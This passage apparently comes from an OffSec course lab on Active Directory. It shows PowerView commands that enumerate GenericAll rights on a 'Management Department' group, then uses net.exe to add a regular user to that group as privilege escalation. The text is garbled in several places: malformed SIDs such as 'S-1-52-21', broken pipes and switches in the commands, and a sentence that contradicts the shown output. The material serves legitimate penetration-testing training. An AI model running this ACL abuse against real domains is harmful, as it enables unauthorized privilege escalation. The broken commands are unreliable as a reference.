# OffSec

```
PS:\<Tools> Get-ObjectAcl -Identity "Management Department" | |
{$..ActiveDirectoryRights -eq "GenericAll" | select
SecurityIdentifier,ActiveDirectoryRights
```

| SecurityIdentifier | ActiveDirectoryRights |
| S-1-52-21-198370270-658905905-1718884369-512 | GenericAll |
| S-1-52-21-198370270-658905905-1718884369-1104 | GenericAll |
| S-1-5-32-58 | GenericAll |
| S-1-5-18 | GenericAll |
| S-1-52-21-198370270-658905905-1718884369-519 | GenericAll |

> Listing 771 - Enumerating ACLs for the Management Group

In this case, we have a total of five objects that have the GenericAll permission on the Management Department object. To make sense of this, let us convert the SIDs into data names:

```
PS:\<Tools> "S-1-52-21-198370270-658905905-1718884369-512", "S-1-52-21-198370270-658905905-1718884369-1104", "S-1-5-32-58", "S-1-5-18", "S-1-52-21-198370270-658905905-1718884369-519"
Convert-SidToName
```

+   CORP:Domain Admins
CORP:stephanie
BUILTIN:Account Operators
Local System
CORP:Enterprise Admins

> Listing 772 - Converting SIDs that have GenericAll permission on the Management Group

The first SID belongs to the Domain Admins group and the GenericAll permission comes as no surprise Domain Admins have the highest privilege possible in the domain. What's interesting, however, is to find stephanie, a regular domain user should not have GenericAll permissions on all objects in AD, so this may be a misconfiguration.

This finding significant indicates that stephanie is a powerful account.

When we enumerated the Management Group, we discovered that jen was the only member. As an experiment to show the power of misconfigured objects, let's try to use our permissions to add stephanie to this group with net.exe.

```
PS:\<Tools> net group "Management Department" stephanie /add / domain
The request will be processed at a domain controller for domain corp.com.
```

The command completed successfully.

> Listing 773 - Using "net.exe" to add user to group

Based on the output, we show jen was member of the group. We can verify this with Get-NetGroup.

```
PS:\<Tools> Get-NetGroup "Management Department" | select member

member
(CN=jen,CN=Users,DC=corp,DC=com,CN=stephanie,CN=Users,DC=corp,DC=com)
```

> Listing 774 - Running 'Get-NetGroup' to enumerate 'Management Department'

This reveals that jen is no longer the sole member of the group and we have successfully added stephanie user in there as well.